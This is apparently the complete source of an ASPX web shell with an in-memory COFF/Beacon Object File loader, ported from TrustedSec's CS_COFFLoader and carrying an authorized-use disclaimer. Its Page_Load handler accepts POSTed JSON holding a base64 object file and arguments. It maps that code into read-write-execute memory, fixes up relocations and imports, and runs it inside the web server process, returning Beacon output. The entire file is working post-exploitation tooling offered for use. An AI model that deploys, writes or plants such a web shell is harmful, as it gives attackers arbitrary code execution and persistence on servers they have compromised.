<%--
    ASPX Web Shell with COFF Loader
    Based on TrustedSec's CS_COFFLoader: https://github.com/trustedsec/CS_COFFLoader
    Ported by Eugenie Potseluevskaya
    
    For security research and authorized penetration testing only.
    Use strictly on systems you own or have explicit written permission to test.
    Unauthorized use is illegal and the author assumes no liability
    for misuse or damages resulting from this code.
--%>
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>

<script runat="server">

[StructLayout(LayoutKind.Sequential)]
public struct COFF_FILE_HEADER
{
    public ushort Machine;
    public ushort NumberOfSections;
    public int TimeDateStamp;
    public int PointerToSymbolTable;
    public int NumberOfSymbols;
    public ushort SizeOfOptionalHeader;
    public ushort Characteristics;
}

[StructLayout(LayoutKind.Sequential)]
public struct COFF_SECT
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public byte[] Name;
    public int VirtualSize;
    public int VirtualAddress;
    public int SizeOfRawData;
    public int PointerToRawData;
    public int PointerToRelocations;
    public int PointerToLineNumbers;
    public ushort NumberOfRelocations;
    public ushort NumberOfLinenumbers;
    public int Characteristics;
}

[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct COFF_RELOC
{
    public int VirtualAddress;
    public int SymbolTableIndex;
    public ushort Type;
}

[StructLayout(LayoutKind.Explicit, Pack = 1)]
public struct COFF_SYM
{
    [FieldOffset(0)]
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public byte[] Name;

    [FieldOffset(0)]
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
    public int[] value_u;

    [FieldOffset(8)]
    public int Value;

    [FieldOffset(0xc)]
    public ushort SectionNumber;

    [FieldOffset(0xe)]
    public ushort Type;

    [FieldOffset(0x10)]
    public byte StorageClass;

    [FieldOffset(0x11)]
    public byte NumberOfAuxSymbols;
}

[StructLayout(LayoutKind.Sequential)]
public struct BEACON_FUNCTION
{
    public uint hash;
    public IntPtr function;

    public BEACON_FUNCTION(uint hash, IntPtr function)
    {
        this.hash = hash;
        this.function = function;
    }
}

public class Win32
{
    [Flags]
    public enum AllocationType
    {
        NULL = 0x0,
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    public enum MemoryProtection : uint
    {
        PAGE_EXECUTE = 0x00000010,
        PAGE_EXECUTE_READ = 0x00000020,
        PAGE_EXECUTE_READWRITE = 0x00000040,
        PAGE_EXECUTE_WRITECOPY = 0x00000080,
        PAGE_NOACCESS = 0x00000001,
        PAGE_READONLY = 0x00000002,
        PAGE_READWRITE = 0x00000004,
        PAGE_WRITECOPY = 0x00000008,
        PAGE_GUARD = 0x00000100,
        PAGE_NOCACHE = 0x00000200,
        PAGE_WRITECOMBINE = 0x00000400
    }

    public static int IMAGE_REL_AMD64_ADDR64   = 0x0001;
    public static int IMAGE_REL_AMD64_ADDR32NB = 0x0003;
    public static int IMAGE_REL_AMD64_REL32    = 0x0004;
    public static int IMAGE_REL_AMD64_REL32_5  = 0x0009;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetLastError();

    [DllImport("msvcrt.dll", EntryPoint = "memcpy",
        CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
    public static extern IntPtr memcpy(IntPtr dest, byte[] src, UInt32 count);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern bool VirtualFreeEx(
        IntPtr hProcess, IntPtr lpAddress,
        IntPtr dwSize, AllocationType dwFreeType);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string dllToLoad);
}

class CoffParser
{
    private delegate int tmpFuncDelegate(IntPtr argData, int argSize);
    private delegate IntPtr FuncDelegate_GetOutput(ref int argSize);
    private static List<IntPtr> beaconSectionMapping;
    private static List<IntPtr> coffSectionMapping;
    private static List<BEACON_FUNCTION> BeaconInternalMapping;

    private static IntPtr beaconFunctionMapping;
    private static IntPtr coffFunctionMapping;

    private static uint hash_djb(byte[] data)
    {
        byte c;
        uint hash = 5381;
        for (int count = 0; count < data.Length; count++)
        {
            c = data[count];
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }

    private static void memset(IntPtr dst, byte src, int size)
    {
        byte[] zeros = new byte[size];
        for (int i = 0; i < size; i++) zeros[i] = src;
        Marshal.Copy(zeros, 0, dst, size);
    }

    private static void memcpy(IntPtr dst, IntPtr src, int size)
    {
        byte[] tmp = new byte[size];
        Marshal.Copy(src, tmp, 0, size);
        Marshal.Copy(tmp, 0, dst, size);
    }

    private static int memcmp(byte[] dst, string src)
    {
        int size = src.Length;
        if (dst.Length < size) return 1;
        int nullIdx = Array.IndexOf(dst, (byte)0);
        int effectiveLen = nullIdx >= 0 ? nullIdx : dst.Length;
        string dd = Encoding.Default.GetString(dst, 0, Math.Min(effectiveLen, size));
        return dd == src ? 0 : 1;
    }

    private static object ReadStruct(IntPtr basePtr, int offset, Type t)
    {
       return Marshal.PtrToStructure(IntPtr.Add(basePtr, offset), t);
    }

    private static IntPtr process_symbol(string symbolstring)
    {
        int PREPENDSYMBOLVALUELEN = 6;
        string localfunc;
        string[] subs;
        string locallib;
        string localfunc2;
        IntPtr hModule;

        if (symbolstring.Contains("__ms_"))
            PREPENDSYMBOLVALUELEN = 5;
        if (symbolstring.Length < PREPENDSYMBOLVALUELEN)
            return IntPtr.Zero;

        if (symbolstring.StartsWith("MSVCRT") == true)
            localfunc = symbolstring;
        else
            localfunc = symbolstring.Substring(PREPENDSYMBOLVALUELEN);

        foreach (BEACON_FUNCTION tmp in BeaconInternalMapping)
        {
            if (hash_djb(Encoding.Default.GetBytes(localfunc)) == tmp.hash)
                return tmp.function;
        }

        if ((localfunc == "LoadLibraryA") || (localfunc == "GetProcAddress") ||
            (localfunc == "FreeLibrary") || (localfunc == "GetModuleHandleA"))
        {
            hModule = Win32.LoadLibrary("Kernel32.dll");
            return Win32.GetProcAddress(hModule, localfunc);
        }

        if (symbolstring.Contains("$") == false)
            return IntPtr.Zero;

        subs = localfunc.Split(new char[] { '$' });
        locallib = subs[0] + ".dll";
        subs = localfunc.Substring(subs[0].Length + 1).Split(new char[] { '@' });
        localfunc2 = subs[0];

        hModule = Win32.GetModuleHandle(locallib);
        if (hModule == IntPtr.Zero)
            hModule = Win32.LoadLibrary(locallib);

        return Win32.GetProcAddress(hModule, localfunc2);
    }

    public static int parseCOFF(
        byte[] functionname, byte[] data, int filesize,
        byte[] argumentdata, int argumentSize)
    {
       int coffFileHeaderSize = Marshal.SizeOf(typeof(COFF_FILE_HEADER));
       int coffSectSize       = Marshal.SizeOf(typeof(COFF_SECT));
       int coffRelocSize      = Marshal.SizeOf(typeof(COFF_RELOC));
       int coffSymSize        = Marshal.SizeOf(typeof(COFF_SYM));

        int functionMappingCount = 0;
        int retcode = 0, counter = 0, reloccount = 0, tempcounter = 0, symptr = 0;
        uint offsetvalue = 0;
        bool isBeaconObject = argumentdata == null;

        List<IntPtr> sectionMapping;
        IntPtr functionMapping;
        IntPtr unmanagedData = IntPtr.Zero;

        try { unmanagedData = Marshal.AllocHGlobal(data.Length); }
        catch { retcode = 1; goto cleanup; }

        if (isBeaconObject)
        {
            beaconSectionMapping  = new List<IntPtr>();
            coffSectionMapping    = new List<IntPtr>();
            BeaconInternalMapping = new List<BEACON_FUNCTION>();
            sectionMapping        = beaconSectionMapping;
            beaconFunctionMapping = Win32.VirtualAlloc(IntPtr.Zero, 2048,
                (uint)(Win32.AllocationType.Commit | Win32.AllocationType.Reserve | Win32.AllocationType.TopDown),
                (uint)Win32.MemoryProtection.PAGE_EXECUTE_READWRITE);
            coffFunctionMapping = Win32.VirtualAlloc(IntPtr.Zero, 2048,
                (uint)(Win32.AllocationType.Commit | Win32.AllocationType.Reserve | Win32.AllocationType.TopDown),
                (uint)Win32.MemoryProtection.PAGE_EXECUTE_READWRITE);
            functionMapping = beaconFunctionMapping;
        }
        else
        {
            sectionMapping  = coffSectionMapping;
            functionMapping = coffFunctionMapping;
        }

        if (data == null) goto cleanup;

        Marshal.Copy(data, 0, unmanagedData, data.Length);
        COFF_FILE_HEADER coff_header = (COFF_FILE_HEADER)ReadStruct(unmanagedData, 0, typeof(COFF_FILE_HEADER));

        for (counter = 0; counter < coff_header.NumberOfSections; counter++)
        {
            COFF_SECT coff_sect = (COFF_SECT)ReadStruct(unmanagedData, coffFileHeaderSize + (counter * coffSectSize), typeof(COFF_SECT));
            int rawSize = coff_sect.SizeOfRawData;

            IntPtr tmpAddr = Win32.VirtualAlloc(IntPtr.Zero, (uint)rawSize,
                (uint)(Win32.AllocationType.Commit | Win32.AllocationType.Reserve | Win32.AllocationType.TopDown),
                (uint)Win32.MemoryProtection.PAGE_EXECUTE_READWRITE);

            if (coff_sect.PointerToRawData > 0)
                memcpy(tmpAddr, IntPtr.Add(unmanagedData, coff_sect.PointerToRawData), rawSize);

            sectionMapping.Add(tmpAddr);
        }

        for (counter = 0; counter < coff_header.NumberOfSections; counter++)
        {
            COFF_SECT coff_sect = (COFF_SECT)ReadStruct(unmanagedData, coffFileHeaderSize + (counter * coffSectSize), typeof(COFF_SECT));

            for (reloccount = 0; reloccount < coff_sect.NumberOfRelocations; reloccount++)
            {
                COFF_RELOC coff_reloc = (COFF_RELOC)ReadStruct(unmanagedData, coff_sect.PointerToRelocations + (coffRelocSize * reloccount), typeof(COFF_RELOC));
                COFF_SYM coff_sym = (COFF_SYM)ReadStruct(unmanagedData, coff_header.PointerToSymbolTable + (coff_reloc.SymbolTableIndex * coffSymSize), typeof(COFF_SYM));

                if (coff_sym.value_u[0] != 0)
                {
                    if (coff_reloc.Type == Win32.IMAGE_REL_AMD64_ADDR64)
                    {
                        ulong lv = (ulong)Marshal.ReadInt64(
                            new IntPtr(sectionMapping[counter].ToInt64() + coff_reloc.VirtualAddress));
                        lv = (ulong)sectionMapping[coff_sym.SectionNumber - 1].ToInt64() + lv;
                        Marshal.WriteInt64(
                            new IntPtr(sectionMapping[counter].ToInt64() + coff_reloc.VirtualAddress),
                            (long)lv);
                    }
                    else if (coff_reloc.Type == Win32.IMAGE_REL_AMD64_ADDR32NB)
                    {
                        offsetvalue = (uint)Marshal.ReadInt32(
                            new IntPtr(sectionMapping[counter].ToInt64() + coff_reloc.VirtualAddress));
                        long a = sectionMapping[coff_sym.SectionNumber - 1].ToInt64() + offsetvalue;
                        long b = sectionMapping[counter].ToInt64() + coff_reloc.VirtualAddress + 4;
                        if ((a - b) > 0xffffffff) { retcode = 1; goto cleanup; }
                        Marshal.WriteInt32(new IntPtr(b - 4), (int)(uint)(a - b));
                    }
                    else if (coff_reloc.Type == Win32.IMAGE_REL_AMD64_REL32)
                    {
                        offsetvalue = (uint)Marshal.ReadInt32(
                            new IntPtr(sectionMapping[counter].ToInt64() + coff_reloc.VirtualAddress));
                        if (!(coff_sym.SectionNumber == 0 && coff_sym.Value == 0))
                        {
                            long a = sectionMapping[coff_sym.SectionNumber - 1].ToInt64();
                            long b = sectionMapping[counter].ToInt64() + coff_reloc.VirtualAddress + 4;
                            if ((a - b) > 0xffffffff) { retcode = 1; goto cleanup; }
                            offsetvalue += (uint)(a - b);
                            offsetvalue += (uint)coff_sym.Value;
                            offsetvalue += (uint)(coff_reloc.Type - Win32.IMAGE_REL_AMD64_REL32);
                            Marshal.WriteInt32(new IntPtr(b - 4), (int)offsetvalue);
                        }
                    }
                }
                else
                {
                    symptr = coff_sym.value_u[1];
                    int offset = coff_header.PointerToSymbolTable
                        + (coff_header.NumberOfSymbols * coffSymSize) + symptr;
                    string functionName = Marshal.PtrToStringAnsi(IntPtr.Add(unmanagedData, offset));

                    IntPtr funcptrlocation = process_symbol(functionName);
                    if (funcptrlocation == IntPtr.Zero && !isBeaconObject)
                    { retcode = 1; goto cleanup; }

                    if (coff_reloc.Type == Win32.IMAGE_REL_AMD64_REL32)
                    {
                        long a = functionMapping.ToInt64() + functionMappingCount * 8;
                        long b = sectionMapping[counter].ToInt64() + coff_reloc.VirtualAddress + 4;
                        if ((a - b) > 0xffffffff) { retcode = 1; goto cleanup; }
                        Win32.memcpy(new IntPtr(a), BitConverter.GetBytes(funcptrlocation.ToInt64()), 8);
                        Win32.memcpy(new IntPtr(b - 4), BitConverter.GetBytes(a - b), 4);
                        functionMappingCount++;
                    }
                    else if (coff_reloc.Type >= Win32.IMAGE_REL_AMD64_REL32
                          && coff_reloc.Type <= Win32.IMAGE_REL_AMD64_REL32_5)
                    {
                        long a = sectionMapping[coff_sym.SectionNumber - 1].ToInt64();
                        long b = sectionMapping[counter].ToInt64() + coff_reloc.VirtualAddress + 4;
                        IntPtr c = new IntPtr(b - 4);
                        if ((a - b) > 0xffffffff) { retcode = 1; goto cleanup; }
                        long ov1 = (long)Marshal.ReadInt32(c);
                        ov1 += sectionMapping[coff_sym.SectionNumber - 1].ToInt64() - b;
                        ov1 += coff_sym.Value;
                        ov1 += (coff_reloc.Type - Win32.IMAGE_REL_AMD64_REL32);
                        Marshal.WriteIntPtr(c, new IntPtr(ov1));
                    }
                }
            }
        }

        for (tempcounter = 0; tempcounter < coff_header.NumberOfSymbols; tempcounter++)
        {
            COFF_SYM coff_sym = (COFF_SYM)ReadStruct(unmanagedData, coff_header.PointerToSymbolTable + (tempcounter * coffSymSize), typeof(COFF_SYM));

            if (!isBeaconObject)
            {
                if (memcmp(coff_sym.Name, Encoding.Default.GetString(functionname)) == 0)
                {
                    tmpFuncDelegate foo = (tmpFuncDelegate)Marshal.GetDelegateForFunctionPointer(
                        new IntPtr(sectionMapping[coff_sym.SectionNumber - 1].ToInt64() + coff_sym.Value),
                        typeof(tmpFuncDelegate));
                    int size = argumentdata.Length;
                    IntPtr funcName = Win32.VirtualAlloc(IntPtr.Zero, (uint)size,
                        (uint)(Win32.AllocationType.Commit | Win32.AllocationType.Reserve | Win32.AllocationType.TopDown),
                        (uint)Win32.MemoryProtection.PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(argumentdata, 0, funcName, size);
                    foo(funcName, argumentSize);
                    Win32.VirtualFreeEx(IntPtr.Zero, funcName, IntPtr.Zero, Win32.AllocationType.Release);
                    break;
                }
            }
            else
            {
                if (coff_sym.value_u[0] != 0 || coff_sym.Type != 0x20 || coff_sym.SectionNumber != 1)
                    continue;
                int nameOffset = coff_header.PointerToSymbolTable
                    + (coff_header.NumberOfSymbols * coffSymSize) + coff_sym.value_u[1];
                string functionName = Marshal.PtrToStringAnsi(IntPtr.Add(unmanagedData, nameOffset));
                IntPtr functionAddress = new IntPtr(
                    sectionMapping[coff_sym.SectionNumber - 1].ToInt64() + coff_sym.Value);
                BeaconInternalMapping.Add(new BEACON_FUNCTION(
                    hash_djb(Encoding.Default.GetBytes(functionName)), functionAddress));
            }
        }

        cleanup:
        if (unmanagedData != IntPtr.Zero) Marshal.FreeHGlobal(unmanagedData);
        if (!isBeaconObject) CleanUpMemoryAllocations();
        return retcode;
    }

    public static int ZeroAndFree(IntPtr ptr, int size)
    {
        try
        {
            if (size > 0) memset(ptr, (byte)'\x00', size);
            Win32.VirtualFreeEx(IntPtr.Zero, ptr, IntPtr.Zero, Win32.AllocationType.Release);
        }
        catch { }
        return 0;
    }

    public static int CleanUpMemoryAllocations()
    {
        foreach (IntPtr ptr in beaconSectionMapping) ZeroAndFree(ptr, 0);
        foreach (IntPtr ptr in coffSectionMapping)   ZeroAndFree(ptr, 0);
        if (beaconFunctionMapping != IntPtr.Zero) ZeroAndFree(beaconFunctionMapping, 2048);
        if (coffFunctionMapping   != IntPtr.Zero) ZeroAndFree(coffFunctionMapping,   2048);
        return 0;
    }

    public static string getBeaconOutputData()
    {
        IntPtr functionaddress = IntPtr.Zero;
        int output_size = 0;
        uint local_hash = hash_djb(Encoding.Default.GetBytes("BeaconGetOutputData"));
        foreach (BEACON_FUNCTION tmp in BeaconInternalMapping)
        {
            if (local_hash == tmp.hash) { functionaddress = tmp.function; break; }
        }
        if (functionaddress == IntPtr.Zero) return "";
        FuncDelegate_GetOutput foo = (FuncDelegate_GetOutput)
            Marshal.GetDelegateForFunctionPointer(functionaddress, typeof(FuncDelegate_GetOutput));
        IntPtr output = foo(ref output_size);
        return Marshal.PtrToStringAnsi(output, output_size);
    }
}

public class COFFLoader
{
   public static byte[] UnhexlifyBytes(string hex)
   {
    int count = hex.Length / 2;
    byte[] result = new byte[count];
    for (int i = 0; i < count; i++)
        result[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
    return result;
    }

    public static byte[] Decode(string encodedBuffer)
    {
        return Convert.FromBase64String(encodedBuffer);
    }

    public static string RunCoff(string functionName, string coffData, string argDataHex)
    {
        byte[] functionname = Encoding.ASCII.GetBytes(functionName);
        byte[] coff_data    = Decode(coffData);
        string hexStr   = Encoding.ASCII.GetString(Decode(argDataHex));
        byte[] arg_data = UnhexlifyBytes(hexStr);
        byte[] beacon_data  = Decode("{{BEACON_DATA}}");

        if (CoffParser.parseCOFF(new byte[] { }, beacon_data, beacon_data.Length, null, 0) == 1)
        {
            CoffParser.CleanUpMemoryAllocations();
            return "parseCOFF Beacon compat failed: 1";
        }

        if (CoffParser.parseCOFF(functionname, coff_data, coff_data.Length, arg_data, arg_data.Length) == 1)
            return "parseCOFF failed: 1";

        return CoffParser.getBeaconOutputData();
    }
}

void Page_Load(object sender, EventArgs e)
{
    Response.ContentType = "text/plain";

    if (Request.HttpMethod != "POST")
    {
        Response.StatusCode = 405;
        return;
    }

    try
    {
        string body;
        using (var reader = new System.IO.StreamReader(Request.InputStream, Encoding.UTF8))
            body = reader.ReadToEnd();

        // Parse JSON: expects { "function": "...", "coff": "...", "args": "..." }
        var json = new JavaScriptSerializer();
        var req  = json.Deserialize<System.Collections.Generic.Dictionary<string, string>>(body);

        string functionName = req["function"];  // plain text, e.g. "go"
        string coffData     = req["coff"];      // base64-encoded .o file
        string argDataHex   = req["args"];      // base64-encoded hex string of packed args

        string output = COFFLoader.RunCoff(functionName, coffData, argDataHex);

        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.StatusCode = 500;
        Response.Write("Error: " + ex.Message);
    }
}

</script>
